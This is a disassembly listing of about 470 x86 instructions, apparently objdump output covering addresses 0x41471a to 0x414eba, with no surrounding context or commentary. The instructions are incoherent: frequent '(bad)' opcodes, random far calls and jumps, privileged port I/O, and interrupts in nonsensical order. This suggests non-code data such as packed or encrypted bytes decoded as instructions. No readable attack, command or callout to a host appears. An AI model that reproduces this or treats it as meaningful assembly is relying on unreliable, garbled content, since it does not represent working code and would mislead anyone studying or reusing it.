  41471a:	mov    esi,fs
  41471c:	sub    eax,0xb5ab5dbd
  414721:	(bad)
  414724:	mov    eax,ds:0xba5f8d2d
  414729:	or     ecx,DWORD PTR [eax-0x7e9b231a]
  41472f:	std    
  414730:	jae    0x4146bc
  414732:	push   esi
  414733:	sub    ah,BYTE PTR [esp+edx*8+0x60]
  414737:	mov    bh,0x76
  414739:	(bad)  
  41473b:	cdq    
  41473c:	std    
  41473d:	aad    0xa5
  41473f:	mov    ds:0x8c1a9034,eax
  414744:	gs call 0x6a7e:0xaf658fcd
  41474c:	out    0x88,eax
  41474e:	xchg   ebx,eax
  41474f:	inc    ecx
  414750:	or     edi,DWORD PTR [edx]
  414752:	push   es
  414753:	sbb    bl,BYTE PTR [edi-0x46]
  414756:	cmp    BYTE PTR [si+0x1b],al
  41475a:	sub    ah,BYTE PTR [edx+0x44636694]
  414760:	ins    DWORD PTR es:[edi],dx
  414761:	mov    bl,0xa7
  414763:	xor    BYTE PTR [esi+0x3f],bh
  414766:	shl    BYTE PTR [ebp+0x58b11c89],0xe1
  41476d:	mov    dl,0xd2
  41476f:	adc    DWORD PTR [esi+0x10],ecx
  414772:	rol    DWORD PTR [edi-0x5a],cl
  414775:	int3   
  414776:	jecxz  0x41477e
  414778:	sub    eax,0xf0a4a114
  41477d:	sahf   
  41477e:	scas   al,BYTE PTR es:[edi]
  41477f:	push   ebx
  414780:	cmp    DWORD PTR [ebx+esi*4-0x43],0x45
  414785:	popf   
  414786:	(bad)  
  414787:	push   es
  414788:	dec    ecx
  414789:	xor    eax,0x893ce152
  41478e:	sbb    al,0x21
  414790:	xchg   edi,eax
  414791:	les    ebx,FWORD PTR [ecx-0x5c4756e6]
  414797:	repz or al,0x1f
  41479a:	mov    ds:0xd50e8de3,al
  41479f:	arpl   di,bx
  4147a1:	outs   dx,DWORD PTR ds:[esi]
  4147a2:	inc    esp
  4147a3:	shl    BYTE PTR [ebx-0x2f],0x96
  4147a7:	inc    edx
  4147a8:	pop    eax
  4147a9:	pop    esp
  4147aa:	sti    
  4147ab:	popf   
  4147ac:	lock jns 0x4147ee
  4147af:	mov    DWORD PTR [ebp+0x3c],edx
  4147b2:	lahf   
  4147b3:	sbb    eax,DWORD PTR [edx-0xd]
  4147b6:	sub    BYTE PTR [ebp-0x4e],dl
  4147b9:	pop    ebx
  4147ba:	clc    
  4147bb:	mov    BYTE PTR [esi-0x18],al
  4147be:	or     dh,BYTE PTR ds:[ebx]
  4147c1:	xlat   BYTE PTR ds:[ebx]
  4147c2:	jmp    0x414779
  4147c4:	pushf  
  4147c5:	call   0xb3cf0d0a
  4147ca:	jbe    0x4147db
  4147cc:	push   ds
  4147cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147ce:	ficom  WORD PTR [eax-0x9]
  4147d1:	pop    ecx
  4147d2:	jg     0x414841
  4147d4:	bound  ecx,QWORD PTR [ecx-0x7c0d4209]
  4147da:	jl     0x414783
  4147dc:	adc    al,BYTE PTR ds:0x37f3b5e3
  4147e2:	ja     0x414852
  4147e4:	rsqrtps xmm4,xmm2
  4147e7:	cdq    
  4147e8:	mov    eax,0x27f8e2d4
  4147ed:	dec    ecx
  4147ee:	ins    BYTE PTR es:[edi],dx
  4147ef:	dec    edi
  4147f0:	loop   0x4147dc
  4147f2:	inc    ebx
  4147f3:	jns    0x4147b7
  4147f5:	pop    ebx
  4147f6:	sbb    ch,BYTE PTR ds:0x31b2330c
  4147fc:	sbb    al,0x13
  4147fe:	(bad)  
  4147ff:	int    0x30
  414801:	retf   
  414802:	push   0xd7d318a6
  414807:	lds    eax,FWORD PTR [edx+ecx*8-0x7d2f740d]
  41480e:	jno    0x41481f
  414810:	and    cl,BYTE PTR ds:0xb79dfa37
  414816:	mov    bh,BYTE PTR [eax-0x64]
  414819:	out    0x5b,al
  41481b:	xchg   ecx,eax
  41481c:	inc    ebx
  41481d:	cli    
  41481e:	adc    BYTE PTR [ecx-0x23],ch
  414821:	cli    
  414822:	xchg   ebx,eax
  414823:	dec    edi
  414824:	mov    dh,0xf1
  414826:	das    
  414827:	push   ebp
  414828:	and    BYTE PTR [ebp-0x5258613d],dh
  41482e:	lahf   
  41482f:	push   eax
  414830:	mov    al,ds:0xf412c23d
  414835:	out    0xb2,al
  414837:	sbb    cl,BYTE PTR [ebx-0x75]
  41483a:	lods   al,BYTE PTR ds:[esi]
  41483b:	inc    ecx
  41483c:	xor    DWORD PTR [edi-0x58fd9f7a],ebx
  414842:	push   ecx
  414843:	(bad)  
  414844:	jmp    0x637e5043
  414849:	imul   bh
  41484b:	sub    DWORD PTR [esi+0x33],ebx
  41484e:	lods   eax,DWORD PTR ds:[esi]
  41484f:	sti    
  414850:	ret    
  414851:	fst    QWORD PTR [ebx+0x1f]
  414854:	xchg   edi,eax
  414855:	das    
  414856:	aas    
  414857:	push   0x38
  414859:	repz inc DWORD PTR [eax+0x1f4b2d58]
  414860:	retf   
  414861:	ins    DWORD PTR es:[edi],dx
  414862:	cld    
  414863:	push   ebp
  414864:	xchg   edi,eax
  414865:	fadd   DWORD PTR [esi]
  414867:	(bad)  
  414868:	stos   BYTE PTR es:[edi],al
  414869:	dec    eax
  41486a:	(bad)  
  41486b:	loope  0x41484d
  41486d:	cdq    
  41486e:	xor    cl,bl
  414870:	mov    eax,ds:0xfe61b52a
  414875:	nop
  414876:	inc    ecx
  414877:	outs   dx,BYTE PTR ds:[esi]
  414878:	sub    BYTE PTR [ebp-0xe27f9d1],bl
  41487e:	loopne 0x414825
  414880:	aad    0x2b
  414882:	or     eax,0x2f52f9db
  414887:	push   esp
  414888:	js     0x41481b
  41488a:	nop
  41488b:	xchg   ebp,eax
  41488c:	sbb    DWORD PTR [ebx],edx
  41488e:	hlt    
  41488f:	stos   DWORD PTR es:[edi],eax
  414890:	(bad)  
  414891:	pop    edx
  414892:	pop    ecx
  414893:	jbe    0x414910
  414895:	(bad)  
  414896:	popa   
  414897:	jl     0x41488b
  414899:	jne    0x414847
  41489b:	out    0x6a,al
  41489d:	jg     0x4148b5
  41489f:	pop    esi
  4148a0:	(bad)  
  4148a1:	or     al,0x94
  4148a3:	adc    BYTE PTR [esi-0x46242d6d],bh
  4148a9:	cmp    al,0x1d
  4148ab:	fdivr  QWORD PTR [ecx+eiz*8+0x25]
  4148af:	stos   DWORD PTR es:[edi],eax
  4148b0:	sub    al,0x21
  4148b2:	fild   QWORD PTR [ecx]
  4148b4:	outs   dx,BYTE PTR ds:[esi]
  4148b5:	xor    al,BYTE PTR [ecx-0x15aaf30f]
  4148bb:	test   al,0x6b
  4148bd:	adc    ebx,edi
  4148bf:	fcomp  QWORD PTR [esi]
  4148c1:	rcr    esp,cl
  4148c3:	stc    
  4148c4:	loopne 0x4148aa
  4148c6:	and    al,0xc7
  4148c8:	imul   bh
  4148ca:	adc    edi,DWORD PTR [eax-0x7dc0f0ad]
  4148d0:	and    ah,BYTE PTR [ebx+ebp*4]
  4148d3:	pop    es
  4148d4:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4148d6:	stos   DWORD PTR es:[edi],eax
  4148d7:	sub    edx,DWORD PTR [ebx-0x10]
  4148da:	adc    ecx,DWORD PTR [ebp-0x35dc7192]
  4148e0:	stos   BYTE PTR es:[edi],al
  4148e1:	clc    
  4148e2:	mov    ecx,edx
  4148e4:	or     BYTE PTR [edx+0x613bab41],bl
  4148ea:	sub    ch,BYTE PTR [eax]
  4148ec:	mov    ecx,0xfa9ad3c
  4148f1:	cld    
  4148f2:	mov    ds:0xfe6a318c,al
  4148f7:	adc    esp,DWORD PTR [eax-0x7e]
  4148fa:	dec    ebp
  4148fb:	adc    BYTE PTR [ebx-0xb665ba7],dh
  414901:	push   0xc2f73ef6
  414906:	jecxz  0x414932
  414908:	dec    edi
  414909:	inc    edx
  41490a:	ja     0x414926
  41490c:	mov    ebp,0xfa0c280f
  414911:	fwait
  414912:	xchg   ecx,eax
  414913:	mov    edi,0xe7e2d48e
  414918:	pop    ss
  414919:	sahf   
  41491a:	xor    al,BYTE PTR ds:0x532fa5b
  414920:	jne    0x4148aa
  414922:	stos   DWORD PTR es:[edi],eax
  414923:	pushf  
  414924:	loop   0x414954
  414926:	mov    ah,ah
  414928:	sbb    eax,0xe65c49bb
  41492d:	ret    
  41492e:	xchg   esi,eax
  41492f:	pop    ds
  414930:	xor    edi,esi
  414932:	cwde   
  414933:	aaa    
  414934:	iret   
  414935:	mov    cl,0x5b
  414937:	mov    cl,0x2e
  414939:	daa    
  41493a:	jns    0x414960
  41493c:	dec    edx
  41493d:	idiv   BYTE PTR [eax-0x29]
  414940:	(bad)  
  414941:	sub    DWORD PTR [ebx+eiz*8],edi
  414944:	sbb    al,BYTE PTR [ebp+0x2e]
  414947:	push   esp
  414948:	pushf  
  414949:	inc    esp
  41494a:	call   0xb6d0:0x4ed69ac3
  414951:	xor    ah,BYTE PTR [ecx+0x264038bd]
  414957:	lods   eax,DWORD PTR ds:[esi]
  414958:	adc    DWORD PTR [ebp+0x70],edi
  41495b:	cmc    
  41495c:	retf   0x67c5
  41495f:	xor    dl,cl
  414961:	arpl   WORD PTR [ebp-0x5825701b],sp
  414967:	push   ebx
  414968:	test   eax,0xb63b59
  41496d:	sub    bh,BYTE PTR [ebp+0x79def7c2]
  414973:	jb     0x4149e2
  414975:	js     0x4149e6
  414977:	or     DWORD PTR [ebx+0x5],eax
  41497a:	and    BYTE PTR [ebx],cl
  41497c:	jne    0x4149fa
  41497e:	sub    ah,bl
  414980:	mov    dh,0xc0
  414982:	test   ch,dl
  414984:	out    dx,eax
  414985:	in     al,0xe4
  414987:	sbb    eax,0x12e734d2
  41498c:	or     bh,ah
  41498e:	push   cs
  41498f:	sub    DWORD PTR [ecx+0x6c2b6f11],edx
  414995:	scas   eax,DWORD PTR es:[edi]
  414996:	stos   DWORD PTR es:[edi],eax
  414997:	jmp    0xb7a2:0x7d38d647
  41499e:	pop    ss
  41499f:	add    esp,esi
  4149a1:	iret   
  4149a2:	xor    ebp,DWORD PTR [ebp-0x25d54b06]
  4149a8:	mov    esp,0xe46a5bf1
  4149ad:	nop
  4149ae:	jl     0x4149af
  4149b0:	shl    ecx,1
  4149b2:	jle    0x4149bf
  4149b4:	cmp    eax,0x860d97cd
  4149b9:	or     al,0x42
  4149bb:	or     ch,dh
  4149bd:	retf   0xb1cb
  4149c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149c1:	jecxz  0x4149ad
  4149c3:	lods   al,BYTE PTR ds:[esi]
  4149c4:	mov    dl,0x68
  4149c6:	(bad)  
  4149c7:	pushf  
  4149c8:	add    ecx,DWORD PTR [ebp-0x3e39aeea]
  4149ce:	cdq    
  4149cf:	daa    
  4149d0:	cmp    dl,cl
  4149d2:	bound  eax,QWORD PTR [esi-0x9ddbd59]
  4149d8:	popa   
  4149d9:	mov    bh,BYTE PTR [edx+0x48526529]
  4149df:	mov    eax,ds:0x5d612f62
  4149e4:	fidiv  WORD PTR [ebp-0x4404ab55]
  4149ea:	shl    BYTE PTR [eax+0x24],1
  4149ed:	push   ds
  4149ee:	inc    ebx
  4149ef:	push   eax
  4149f0:	call   0xbf1d2f7
  4149f5:	dec    esi
  4149f6:	jae    0x4149e7
  4149f8:	ja     0x414a6f
  4149fa:	mov    bl,0xa0
  4149fc:	popa   
  4149fd:	js     0x41498f
  4149ff:	xor    al,0x46
  414a01:	fadd   DWORD PTR [ecx]
  414a03:	xor    al,0xd9
  414a05:	xchg   edx,eax
  414a06:	bound  ebx,QWORD PTR [esi+0x2eb255f3]
  414a0c:	shr    BYTE PTR [edi+edx*2+0x26de521],1
  414a13:	(bad)  
  414a14:	xchg   ecx,eax
  414a15:	stos   BYTE PTR es:[edi],al
  414a16:	arpl   WORD PTR [eax+ebp*8],di
  414a19:	leave  
  414a1a:	pop    eax
  414a1b:	jns    0x4149ed
  414a1d:	dec    ecx
  414a1e:	fisubr DWORD PTR [esi+eax*1+0x58]
  414a22:	lds    ebp,FWORD PTR [edx+0x5706287e]
  414a28:	popa   
  414a29:	pop    esi
  414a2a:	and    eax,0xe0d5e143
  414a2f:	imul   eax,DWORD PTR [ebp+edx*4+0x54],0xfffffff7
  414a34:	ret    0xa1a8
  414a37:	ins    BYTE PTR es:[edi],dx
  414a38:	pop    ebp
  414a39:	adc    DWORD PTR [ebp-0x145f5e26],edi
  414a3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a40:	xchg   ebp,eax
  414a41:	scas   al,BYTE PTR es:[edi]
  414a42:	push   ebx
  414a43:	adc    eax,0x6601a189
  414a48:	xor    dh,dh
  414a4a:	clc    
  414a4b:	fnsave [edx]
  414a4d:	in     al,dx
  414a4e:	std    
  414a4f:	sbb    al,0xed
  414a51:	mov    eax,0x1b5f0869
  414a56:	and    BYTE PTR fs:[eax+ebp*2],dl
  414a5a:	enter  0x9c1d,0x76
  414a5e:	pop    ds
  414a5f:	(bad)  
  414a60:	dec    ecx
  414a62:	popf   
  414a63:	xchg   DWORD PTR [esi-0x58dcac11],ebp
  414a69:	das    
  414a6a:	dec    eax
  414a6b:	dec    edx
  414a6c:	fcomp  QWORD PTR [esi]
  414a6e:	inc    eax
  414a6f:	nop
  414a70:	rol    DWORD PTR [esi-0x66],1
  414a73:	loope  0x4149f8
  414a75:	fnstsw WORD PTR [edx+0xf23f944]
  414a7b:	ja     0x414ad4
  414a7d:	mov    edx,0x209604b3
  414a82:	cs jo  0x414a12
  414a85:	lahf   
  414a86:	pop    ss
  414a87:	popa   
  414a88:	ja     0x414a12
  414a8a:	call   0xfe098550
  414a8f:	push   esp
  414a90:	pop    edi
  414a91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a92:	sub    al,0x5
  414a94:	into   
  414a95:	mov    ds:0x21c12df1,eax
  414a9a:	pop    ebp
  414a9b:	pop    ss
  414a9c:	mov    al,ds:0x101d5797
  414aa1:	inc    edi
  414aa2:	push   ebx
  414aa3:	test   DWORD PTR [eax],esi
  414aa5:	call   0xb267:0x47f53f12
  414aac:	mov    esp,DWORD PTR ds:0x88c9686a
  414ab2:	xchg   ebp,eax
  414ab3:	(bad)  
  414ab4:	mov    dl,0x4d
  414ab6:	fwait
  414ab7:	push   es
  414ab8:	call   0x34c4821e
  414abd:	(bad)  
  414abe:	jle    0x414a67
  414ac0:	mov    ecx,0x30dbf85e
  414ac5:	mov    ebx,0xb2d80e7e
  414aca:	pusha  
  414acb:	sub    DWORD PTR [edx+0x535e7e6f],ebx
  414ad1:	push   ecx
  414ad2:	and    eax,0x3b66f2ef
  414ad7:	dec    esi
  414ad8:	lods   eax,DWORD PTR ds:[esi]
  414ad9:	jnp    0x414b1d
  414adb:	icebp  
  414adc:	test   eax,0x778bfd3f
  414ae1:	scas   al,BYTE PTR es:[edi]
  414ae2:	fcomp  DWORD PTR [edx]
  414ae4:	arpl   WORD PTR [eax],cx
  414ae6:	or     ecx,DWORD PTR [ebx]
  414ae8:	or     eax,0xf2f61551
  414aed:	xor    DWORD PTR [esp+esi*4-0x3a],eax
  414af1:	push   edi
  414af2:	cmp    al,0xa5
  414af4:	push   ecx
  414af5:	lds    eax,FWORD PTR [edi-0x74]
  414af8:	ret    
  414af9:	sbb    ch,BYTE PTR [eax-0x2]
  414afc:	(bad)  
  414afd:	pushf  
  414afe:	mov    esp,0x7fba6cb5
  414b03:	pusha  
  414b04:	sub    cl,BYTE PTR [edi+0x404ba6ba]
  414b0a:	outs   dx,BYTE PTR ds:[esi]
  414b0b:	xchg   DWORD PTR [ebp+eax*4-0x4],ecx
  414b0f:	or     dl,BYTE PTR [esi-0x16]
  414b12:	pop    ss
  414b13:	pop    ecx
  414b14:	stos   DWORD PTR es:[edi],eax
  414b15:	adc    BYTE PTR [ecx],dl
  414b17:	loop   0x414b15
  414b19:	mov    ch,0xf1
  414b1b:	push   0x7a
  414b1d:	dec    eax
  414b1e:	push   edi
  414b1f:	adc    bl,BYTE PTR [esi]
  414b21:	xor    dh,bh
  414b23:	sub    edi,DWORD PTR [eax]
  414b25:	hlt    
  414b26:	mov    dh,0xdc
  414b28:	xchg   ebp,eax
  414b29:	aas    
  414b2a:	xchg   edx,eax
  414b2b:	pop    ebx
  414b2c:	(bad)  
  414b2e:	repnz add ebx,edx
  414b31:	cdq    
  414b32:	push   ds
  414b33:	fcmovbe st,st(4)
  414b35:	data16 mov bl,0xb8
  414b38:	dec    esp
  414b39:	add    al,0xd9
  414b3b:	fmul   st(2),st
  414b3d:	cmp    ch,dl
  414b3f:	sahf   
  414b40:	and    ebp,esi
  414b42:	or     esi,DWORD PTR [esi]
  414b44:	xor    eax,0xcfa409d1
  414b49:	pop    edi
  414b4a:	mov    ecx,0x8a83df76
  414b4f:	push   ebp
  414b50:	push   esp
  414b51:	or     eax,0xe7c12740
  414b56:	out    dx,al
  414b57:	xchg   edx,eax
  414b58:	(bad)  
  414b59:	(bad)  
  414b5a:	mov    ecx,0x3e929684
  414b5f:	pop    esp
  414b60:	aad    0x83
  414b62:	sbb    ebx,DWORD PTR [ecx-0x67150354]
  414b68:	push   ecx
  414b69:	xchg   BYTE PTR ds:0x12ec1f61,bh
  414b6f:	cmp    esp,esp
  414b71:	and    eax,0xd89be53b
  414b76:	repz mov ebp,0x47ccb07
  414b7c:	jge    0x414b01
  414b7e:	mov    edx,0x29f2b5b3
  414b83:	push   esp
  414b84:	pop    ebx
  414b85:	mov    ds:0x8553c707,eax
  414b8a:	bound  esi,QWORD PTR [eax+0x14]
  414b8d:	mov    esp,0xad2ada53
  414b92:	fs (bad) 
  414b94:	test   BYTE PTR [ebx],0x72
  414b97:	test   DWORD PTR [esi],edx
  414b99:	cmp    BYTE PTR [esi+0x1bee799f],dl
  414b9f:	call   0xba66f722
  414ba4:	sbb    BYTE PTR [ebp+0x9182d7e],bh
  414baa:	push   ebp
  414bab:	(bad)  
  414bad:	sar    BYTE PTR [ebx+0x5145a0c6],0x7f
  414bb4:	mov    al,ds:0x4e68df4c
  414bb9:	jno    0x414c2a
  414bbb:	jmp    0xa908eec8
  414bc0:	out    0x33,al
  414bc2:	scas   eax,DWORD PTR es:[edi]
  414bc3:	shr    DWORD PTR [ebx],cl
  414bc5:	push   es
  414bc6:	xor    ah,BYTE PTR [ebp-0x2a]
  414bc9:	cmp    eax,0x303dd440
  414bce:	adc    eax,ecx
  414bd0:	adc    cl,BYTE PTR [ebx-0x59]
  414bd3:	mov    WORD PTR [edx],?
  414bd5:	scas   al,BYTE PTR es:[edi]
  414bd6:	mov    bh,BYTE PTR [esi]
  414bd8:	or     DWORD PTR [ebx-0x56defaa5],ebp
  414bde:	inc    esp
  414bdf:	fmul   QWORD PTR [esi-0x781c8d63]
  414be5:	call   0x88a5:0xdb3113a2
  414bec:	jns    0x414c41
  414bee:	or     esp,DWORD PTR [ebx]
  414bf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414bf1:	into   
  414bf2:	jmp    0x414c2a
  414bf4:	push   edx
  414bf5:	and    DWORD PTR [edx+0x33fa1f7b],ebp
  414bfb:	pop    esp
  414bfc:	sahf   
  414bfd:	test   eax,0x5724d099
  414c02:	jnp    0x414bca
  414c04:	mov    eax,0xa80b354f
  414c09:	lock loope 0x414c86
  414c0c:	outs   dx,DWORD PTR ds:[esi]
  414c0d:	xlat   BYTE PTR ds:[ebx]
  414c0e:	test   al,ch
  414c10:	imul   edx,DWORD PTR [edi-0x4331c1b5],0xdb4bea5b
  414c1a:	sbb    DWORD PTR [edx],0xfffffff3
  414c1d:	mov    ch,0xa4
  414c1f:	lahf   
  414c20:	fsub   QWORD PTR [edi]
  414c22:	mov    edx,0x25825d02
  414c27:	sub    ebx,DWORD PTR [esi+0x265b03f2]
  414c2d:	xlat   BYTE PTR ds:[ebx]
  414c2e:	jg     0x414be8
  414c30:	sar    DWORD PTR [eax],0x39
  414c33:	inc    edx
  414c34:	xchg   edx,eax
  414c35:	add    BYTE PTR [edi+0x1dbdcf7c],dl
  414c3b:	test   BYTE PTR [edx],0xf0
  414c3e:	loop   0x414beb
  414c40:	es in  eax,dx
  414c42:	adc    BYTE PTR [ebx+0x762e55ac],cl
  414c48:	adc    esp,esi
  414c4a:	stc    
  414c4b:	sbb    ch,BYTE PTR [eax-0x35b4fe13]
  414c51:	nop
  414c52:	leave  
  414c53:	dec    eax
  414c54:	inc    ebp
  414c55:	scas   al,BYTE PTR es:[edi]
  414c56:	mov    edx,0xb5bba920
  414c5b:	rol    DWORD PTR ds:0xeef24c7b,1
  414c61:	mov    ah,0x8c
  414c63:	and    DWORD PTR [eax-0x7d],0xf4d7e9e7
  414c6a:	dec    edx
  414c6b:	xchg   ebp,eax
  414c6c:	jmp    0x5d44:0x4e111c1
  414c73:	inc    ebp
  414c74:	shr    BYTE PTR [ebx+0x35],1
  414c77:	or     al,0x81
  414c79:	test   BYTE PTR [ecx+0x28],al
  414c7c:	sbb    eax,0xb663dc0e
  414c81:	ds popa 
  414c83:	ins    BYTE PTR es:[edi],dx
  414c84:	(bad)  
  414c85:	repz add eax,esi
  414c88:	mov    al,ds:0x79841047
  414c8d:	xchg   ecx,eax
  414c8e:	pusha  
  414c8f:	and    esi,DWORD PTR [ebp+0x3a]
  414c92:	test   eax,0x49b980dd
  414c97:	icebp  
  414c98:	into   
  414c99:	call   0xa0a1:0xd9fc9d3b
  414ca0:	xchg   esi,eax
  414ca1:	enter  0xabfe,0xbc
  414ca5:	cmc    
  414ca6:	out    0x6f,eax
  414ca8:	jmp    0x7500:0x428c3cd0
  414caf:	mov    WORD PTR [edi],ss
  414cb1:	sub    ecx,DWORD PTR [edi]
  414cb3:	imul   esp,DWORD PTR [esi],0x7
  414cb6:	cli    
  414cb7:	dec    esp
  414cb8:	cli    
  414cb9:	push   ss
  414cba:	scas   eax,DWORD PTR es:[edi]
  414cbb:	push   ebp
  414cbc:	retf   0x2c41
  414cbf:	add    DWORD PTR [ecx+0x22cbb096],ecx
  414cc5:	mov    bh,0x4f
  414cc7:	test   eax,0x141b6919
  414ccc:	xor    eax,DWORD PTR [edi-0x71]
  414ccf:	scas   eax,DWORD PTR es:[edi]
  414cd0:	pop    ecx
  414cd1:	pop    edx
  414cd2:	leave  
  414cd3:	and    eax,0x45cdff5b
  414cd8:	xor    dl,dl
  414cda:	jmp    0x8e7a8f31
  414cdf:	jl     0x414cb1
  414ce1:	inc    edx
  414ce2:	xlat   BYTE PTR ds:[ebx]
  414ce3:	and    bl,dl
  414ce5:	dec    esi
  414ce6:	aas    
  414ce7:	fcmovbe st,st(4)
  414ce9:	mov    eax,edx
  414ceb:	ins    DWORD PTR es:[edi],dx
  414cec:	dec    ebx
  414ced:	push   cs
  414cee:	jae    0x414c71
  414cf0:	test   DWORD PTR [ebx-0xe],ebx
  414cf3:	repnz xchg dl,ch
  414cf6:	sahf   
  414cf7:	clc    
  414cf8:	cmp    ch,BYTE PTR [edi+0x569da577]
  414cfe:	pop    es
  414cff:	adc    eax,0x66cd00a2
  414d04:	push   ds
  414d05:	jge    0x414d4b
  414d07:	jmp    0x414cbf
  414d09:	sahf   
  414d0a:	aas    
  414d0b:	push   edx
  414d0c:	push   ebx
  414d0d:	cld    
  414d0e:	ror    dh,0x67
  414d11:	inc    ecx
  414d12:	xlat   BYTE PTR ds:[ebx]
  414d13:	and    al,0xf3
  414d15:	or     bl,BYTE PTR [edi-0x19]
  414d18:	call   0xafe99244
  414d1d:	jns    0x414d00
  414d1f:	je     0x414d64
  414d21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414d22:	pop    eax
  414d23:	jmp    0x3689c45f
  414d28:	or     al,0xc4
  414d2a:	test   ebx,ebp
  414d2c:	xchg   ecx,eax
  414d2d:	in     eax,0x51
  414d2f:	and    ebx,DWORD PTR [ecx+0x53e988ca]
  414d35:	cmp    DWORD PTR [ecx+0x4718e65b],edi
  414d3b:	push   ebx
  414d3c:	fsub   DWORD PTR [esi+0x47]
  414d3f:	mov    eax,ebx
  414d41:	les    edx,FWORD PTR [edi-0x61f851d7]
  414d47:	sub    ch,al
  414d49:	aaa    
  414d4a:	out    dx,eax
  414d4b:	das    
  414d4c:	xadd   edi,eax
  414d4f:	pop    es
  414d50:	jnp    0x414da1
  414d52:	push   esi
  414d53:	pop    ebp
  414d54:	lock (bad) [edx]
  414d57:	call   0x9bc5757b
  414d5c:	jmp    0x414d12
  414d5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d5f:	push   es
  414d60:	push   ebp
  414d61:	cmp    eax,DWORD PTR [edi]
  414d63:	mov    bh,0x11
  414d65:	(bad)  
  414d66:	mov    ah,0x9b
  414d68:	or     BYTE PTR [edi-0x77],bl
  414d6b:	fnstcw WORD PTR ds:[eax]
  414d6e:	or     bl,BYTE PTR [edx]
  414d70:	xchg   ebx,eax
  414d71:	pop    es
  414d72:	mov    gs,ebp
  414d74:	(bad)  
  414d76:	push   edi
  414d77:	mov    eax,0xb0580595
  414d7c:	fldenv [ebp+ebp*8+0x1c638009]
  414d83:	xchg   ecx,eax
  414d84:	call   0xb2b2:0x9dd4b105
  414d8b:	(bad)  
  414d8c:	(bad)  
  414d8e:	fld    DWORD PTR [edi-0x3e]
  414d91:	outs   dx,BYTE PTR ds:[esi]
  414d92:	icebp  
  414d93:	cmp    ch,BYTE PTR [esi+ecx*4]
  414d96:	sahf   
  414d97:	je     0x414d8b
  414d99:	sar    DWORD PTR [edx-0x186fddc7],0x6d
  414da0:	adc    eax,0xafc5915c
  414da5:	pusha  
  414da6:	iret   
  414da7:	sahf   
  414da8:	adc    BYTE PTR [ebp-0x7a83cfb3],dh
  414dae:	add    DWORD PTR [edx],esp
  414db0:	scas   eax,DWORD PTR es:[edi]
  414db1:	in     al,dx
  414db2:	dec    ebx
  414db3:	ret    
  414db4:	div    DWORD PTR [esi+0xcf8ead]
  414dba:	inc    ebx
  414dbb:	xchg   ebp,eax
  414dbc:	clc    
  414dbd:	mov    ecx,0x84cdef0
  414dc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414dc3:	xor    DWORD PTR [esi+0x63],edi
  414dc6:	push   esi
  414dc7:	cmp    al,0x4f
  414dc9:	and    al,BYTE PTR [ecx+0x4eac0797]
  414dcf:	rcr    eax,cl
  414dd1:	ret    
  414dd2:	adc    BYTE PTR [ecx],ah
  414dd4:	push   esi
  414dd5:	xor    ch,BYTE PTR [esi+0x6c]
  414dd8:	push   0xc0134ad7
  414ddd:	das    
  414dde:	fisub  DWORD PTR [ebx-0x7b]
  414de1:	sbb    BYTE PTR [edx+0x191875b3],al
  414de7:	dec    edx
  414de8:	or     eax,esp
  414dea:	xchg   ecx,eax
  414deb:	inc    ecx
  414dec:	ds inc esi
  414dee:	jne    0x414e0f
  414df0:	fmul   QWORD PTR [esi]
  414df2:	sbb    esp,DWORD PTR [esi]
  414df4:	push   esp
  414df5:	pop    ebp
  414df6:	cld    
  414df7:	call   0x8606719d
  414dfc:	call   0x199786df
  414e01:	push   cs
  414e02:	lods   eax,DWORD PTR ds:[esi]
  414e03:	rcl    DWORD PTR [esp+ebx*2+0x2cd9c4e6],1
  414e0a:	and    ch,BYTE PTR [edx-0x94faa77]
  414e10:	xor    BYTE PTR [edi],bl
  414e12:	test   BYTE PTR [eax],bh
  414e14:	push   esp
  414e15:	mov    edi,0x215a8410
  414e1a:	bound  ebx,QWORD PTR [ebp+0x11409bc6]
  414e20:	fimul  DWORD PTR [esi-0x80]
  414e23:	xchg   esp,eax
  414e24:	cmp    al,0x60
  414e26:	dec    BYTE PTR [ebp+ecx*4+0x7c516d9f]
  414e2d:	jp     0x414e63
  414e2f:	ret    
  414e30:	mov    al,ds:0xb91a6aa7
  414e35:	inc    ebx
  414e36:	mov    eax,ds:0xc7b16b98
  414e3b:	or     esi,DWORD PTR [ecx]
  414e3d:	rcl    BYTE PTR [edi+ecx*2-0x65],0xf7
  414e42:	je     0x414e7c
  414e44:	bound  esp,QWORD PTR [esi+0x7c]
  414e47:	xchg   esi,eax
  414e48:	xor    eax,0x20668525
  414e4d:	retf   
  414e4e:	pop    es
  414e4f:	repnz (bad) 
  414e53:	dec    eax
  414e54:	jb     0x414ecb
  414e56:	lds    edi,FWORD PTR [esi+0x6e]
  414e59:	dec    eax
  414e5a:	jge    0x414ebb
  414e5c:	rol    BYTE PTR [ebx],cl
  414e5e:	dec    eax
  414e5f:	fsub   DWORD PTR [edx-0x58611473]
  414e65:	mov    cl,0xf5
  414e67:	pop    ds
  414e68:	xor    ah,cl
  414e6a:	sahf   
  414e6b:	mov    bh,0x5c
  414e6d:	(bad)  
  414e6e:	mov    cl,0xe3
  414e70:	mov    ebx,0xaed46e1f
  414e75:	sub    ecx,esi
  414e77:	cmp    dh,BYTE PTR ds:0x504c129a
  414e7d:	cld    
  414e7e:	pop    ebp
  414e7f:	sub    DWORD PTR [edx+edx*4],edx
  414e82:	fptan  
  414e84:	or     ch,BYTE PTR [ebx-0x63]
  414e87:	pop    es
  414e88:	xchg   ebp,eax
  414e89:	jg     0x414e6f
  414e8b:	cs (bad) 
  414e8d:	adc    esi,ebx
  414e8f:	mov    ds:0x5e20d235,eax
  414e94:	int    0xd5
  414e96:	ds repnz data16 clc 
  414e9a:	rcl    DWORD PTR [esi+ebx*8],cl
  414e9d:	pop    ds
  414e9e:	add    bh,BYTE PTR [eax*8-0x17793489]
  414ea5:	imul   edi,DWORD PTR [ecx],0xffffffea
  414ea8:	enter  0x2a28,0xdf
  414eac:	mov    ah,0x2
  414eae:	bound  esi,QWORD PTR [eax-0x21a19f40]
  414eb4:	int    0xf9
  414eb6:	fisubr DWORD PTR [eax+0x16]
  414eb9:	(bad)  
  414eba:	(bad)  
